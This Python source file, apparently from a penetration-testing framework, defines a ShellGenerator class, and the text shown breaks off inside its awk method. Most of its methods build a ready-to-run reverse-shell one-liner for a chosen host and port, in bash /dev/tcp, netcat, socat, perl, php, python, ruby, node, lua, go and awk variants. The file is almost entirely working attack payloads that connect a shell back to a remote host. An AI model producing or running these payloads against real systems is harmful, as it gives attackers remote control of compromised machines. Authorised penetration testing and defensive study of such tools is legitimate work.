#!/usr/bin/env python3
# Project: osiris-framework
# Author: Samir Sanchez Garnica @sasaga92
# Version 1.0
# Date: 01/12/2022

from utilities.Colors import color


class ShellGenerator:
    def __init__(self, **kwargs):
        self.__status = {'message': '', 'code': 0}
        self.__language = None
        self.__payload = None
        self.__type = None
        self.__platform_permitted = ['linux', 'windows', 'mac']
        self.__type_permitted = ['bind', 'reverse']

        try:
            self.__platform = kwargs['platform'].strip().lower()
            self.__target = kwargs['target']
            self.__port = str(kwargs['port'])
            self.__type = str(kwargs['type'])
        except KeyError as Error:
            self.__status['code'] = 500
            self.__status['message'] = color.color("lgray", "The parameters ") + color.color("yellow",
                                                                                             "{") + color.color("lgray",
                                                                                                                Error) + color.color(
                "yellow", "} ") + color.color("lgray", "are mandatory in the class") + color.color("yellow",
                                                                                                   " ShellGenerator")

            if 'platform' in Error.args[0]:
                self.__platform = ""

        if not self.__platform in self.__platform_permitted:
            self.__status['message'] = color.color("lgray", "The parameters ") + color.color("yellow",
                                                                                             "{") + color.color("lgray",
                                                                                                                'platform') + color.color(
                "yellow", "} ") + color.color("lgray", "not is valid in the class") + color.color("yellow",
                                                                                                  " ShellGenerator")
        if not self.__type in self.__type_permitted:
            self.__status['message'] = color.color("lgray", "The parameters ") + color.color("yellow",
                                                                                             "{") + color.color("lgray",
                                                                                                                'type') + color.color(
                "yellow", "} ") + color.color("lgray", "not is valid in the class") + color.color("yellow",
                                                                                                  " ShellGenerator")

    def bash_i(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "/bin/bash -i >& /dev/tcp/{}/{} 0>&1".format(self.__target, self.__port)

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def bash_196(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "0<&196;exec 196<>/dev/tcp/{}/{}; /bin/bash <&196 >&196 2>&196".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def bash_readline(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def bash_5(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "/bin/bash -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def bash_udp(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "/bin/bash -i >& /dev/udp/{}/{} 0>&1".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def nc_mkfifo(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {} {} >/tmp/f".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def nc_e(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "nc {} {} -e /bin/bash".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def nc_c(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "nc -c /bin/bash {} {}".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def ncat_e(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "ncat {} {} -e /bin/bash".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def ncat_udp(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|ncat -u {} {} >/tmp/f".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def rustcat(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "rcat {} {} -r /bin/bash".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def perl(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "perl -e \'use Socket;$i=\""+self.__target+"\";$p="+self.__port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};\'"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def perl_nosh(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\""+self.__target+":"+self.__port+"\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def php_exec(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "php -r \'$sock=fsockopen(\"{}\",{});exec(\"/bin/bash <&3 >&3 2>&3\");\'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def php_shell_exec(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "php -r \'$sock=fsockopen(\"{}\",{});shell_exec(\"/bin/bash <&3 >&3 2>&3\");'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def php_system(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "php -r '$sock=fsockopen(\"{}\",{});system(\"/bin/bash <&3 >&3 2>&3\");'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def php_passthru(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "php -r '$sock=fsockopen(\"{}\",{});passthru(\"/bin/bash <&3 >&3 2>&3\");'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def php_popen(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "php -r '$sock=fsockopen(\"{}\",{});popen(\"/bin/bash <&3 >&3 2>&3\", \"r\");'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def php_proc_popen(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "php -r \'$sock=fsockopen(\"{}\",{});$proc=proc_open(\"/bin/bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def python_1(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "export RHOST=\"{}\";export RPORT={};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")\'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def python_2(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def python_3_1(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "export RHOST=\"{}\";export RPORT={};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")\'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def python_3_2(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def python3_shortest(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "python3 -c \'import os,pty,socket;s=socket.socket();s.connect((\"{}\",{}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")\'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def ruby(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "ruby -rsocket -e\'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{}\",{}))\'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def ruby_nosh(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "ruby -rsocket -e\'exit if fork;c=TCPSocket.new(\""+self.__target+"\",\""+self.__port+"\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}\'"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def socat(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "socat TCP:{}:{} EXEC:/bin/bash".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def socat_tty(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "socat TCP:{}:{} EXEC:\'/bin/bash\',pty,stderr,setsid,sigint,sane".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def nodejs(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "require(\'child_process\').exec(\'nc -e /bin/bash {} {}\')".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def telnet(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | /bin/bash 1>$TF".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def zsh(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "zsh -c \'zmodload zsh/net/tcp && ztcp {} {} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def lua(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "lua -e \"require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{}\',\'{}\');os.execute(\'/bin/bash -i <&3 >&3 2>&3\');\"".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def lua_2(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "lua5.1 -e \'local host, port = \"{}\", {} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()\'".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def golang(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\""+self.__target+":"+self.__port+"\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def vlang(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "echo \'import os\' > /tmp/t.v && echo \'fn main() { os.system(\"nc -e /bin/bash "+self.__target+" "+self.__port+" 0>&1\") }\' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def awk(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "awk \'BEGIN {s = \"/inet/tcp/0/"+self.__target+"/"+self.__port+"\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}\' /dev/null"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
